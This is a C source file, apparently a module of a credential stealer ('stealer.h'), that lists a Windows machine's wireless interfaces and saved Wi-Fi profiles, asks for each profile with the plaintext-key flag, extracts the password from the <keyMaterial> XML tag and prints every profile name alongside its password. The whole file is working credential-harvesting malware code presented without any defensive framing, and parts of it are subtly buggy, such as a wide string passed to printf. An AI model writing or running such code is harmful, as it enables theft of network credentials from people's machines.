#include "stealer.h"

HANDLE open_wlan_handle(DWORD api_version) {
    
    DWORD negotiatedVersion = 0;
    HANDLE cliendHandle = INVALID_HANDLE_VALUE;

    DWORD result = WlanOpenHandle(api_version, NULL, &negotiatedVersion, &cliendHandle);
    
    if (result != ERROR_SUCCESS) {
        MessageBox(NULL, "Error openning WlanHandle", "Error Popup", MB_OK | MB_ICONWARNING);
        return INVALID_HANDLE_VALUE;
    }

    return cliendHandle;
}

PWLAN_INTERFACE_INFO_LIST enum_wlan_interfaces(HANDLE handle) {

    PWLAN_INTERFACE_INFO_LIST interfaceInfoList = NULL;
    DWORD result = WlanEnumInterfaces(handle, NULL, &interfaceInfoList);

    if (result != ERROR_SUCCESS) {
        MessageBox(NULL, "Error with enumerating interfaces", "Error Popup", MB_OK | MB_ICONWARNING);
        return NULL;
    }

    return interfaceInfoList;
}

PWLAN_PROFILE_INFO_LIST grab_interface_profiles(HANDLE handle, GUID interface_guid) {

    PWLAN_PROFILE_INFO_LIST profileList = NULL;
    DWORD result = WlanGetProfileList(handle, &interface_guid, NULL, &profileList);

    if (result != ERROR_SUCCESS) {
        MessageBox(NULL, "Error grabbing profiles", "Error popup", MB_OK | MB_ICONWARNING);
        return NULL;
    }

    return profileList;
}

BSTR extract_pass_from_xml(const BSTR xml_data) {
    const wchar_t* start_tag = L"<keyMaterial>";
    const wchar_t* end_tag = L"</keyMaterial>";
    
    // Find the start tag
    const wchar_t* password_start = wcsstr(xml_data, start_tag);
    if (password_start == NULL) {
        wprintf(L"Key material tag not found.\n");
        return NULL;
    }
    
    password_start += wcslen(start_tag);
    
    // Find the end tag
    const wchar_t* password_end = wcsstr(password_start, end_tag);
    if (password_end == NULL) {
        wprintf(L"End tag not found.\n");
        return NULL;
    }
    
    // Calculate password length
    size_t password_length = password_end - password_start;
    
    // Allocate memory for password string
    wchar_t* password = SysAllocStringLen(NULL, password_length);
    if (password == NULL) {
        wprintf(L"Memory allocation failed.\n");
        return NULL;
    }
    
    // Copy password data
    wcsncpy_s(password, password_length + 1, password_start, password_length);
    
    return password;
}

void get_plain_text_pass(
    HANDLE handle,
    GUID interface_guid,
    LPCWSTR profile_name
) {

    LPWSTR profile_xml_data = NULL;
    DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;

    DWORD result = WlanGetProfile(
        handle,
        &interface_guid,
        profile_name,
        NULL,
        &profile_xml_data,
        &dwFlags,
        NULL
    );

    if (result != ERROR_SUCCESS) {
        printf("Failed to retrieve XML data for profile: %ls\n", profile_name);
        return;
    }
    
    BSTR password = extract_pass_from_xml(profile_xml_data);
    if (password != NULL) {
        printf(L"Profile name: %ls, Password: %ls\n", profile_name, password);
        SysFreeString(password);
    } else {
        printf("Failed to extract password from XML.\n");
    }

    WlanFreeMemory(profile_xml_data);

}


int main() {

    HANDLE wlan_handle = open_wlan_handle(WLAN_API_VERSION_2);
    PWLAN_INTERFACE_INFO_LIST interface_ptr = enum_wlan_interfaces(wlan_handle);
    
    if (interface_ptr->dwNumberOfItems == 0) {
        printf("No WLAN interfaces were found...");
        return EXIT_FAILURE;
    }

    for (DWORD i = 0; i < interface_ptr->dwNumberOfItems; ++i) {
        WLAN_INTERFACE_INFO interface_info = interface_ptr->InterfaceInfo[i];

        PWLAN_PROFILE_INFO_LIST profile_list = grab_interface_profiles(wlan_handle, interface_info.InterfaceGuid);
        
        for (DWORD j = 0; j < profile_list->dwNumberOfItems; ++j) {
            WLAN_PROFILE_INFO profile_info = profile_list->ProfileInfo[j];
            get_plain_text_pass(wlan_handle, interface_info.InterfaceGuid, profile_info.strProfileName);
        }
        WlanFreeMemory(profile_list);
    }

    WlanFreeMemory(interface_ptr);

    WlanCloseHandle(wlan_handle, NULL);

    return EXIT_SUCCESS;
}
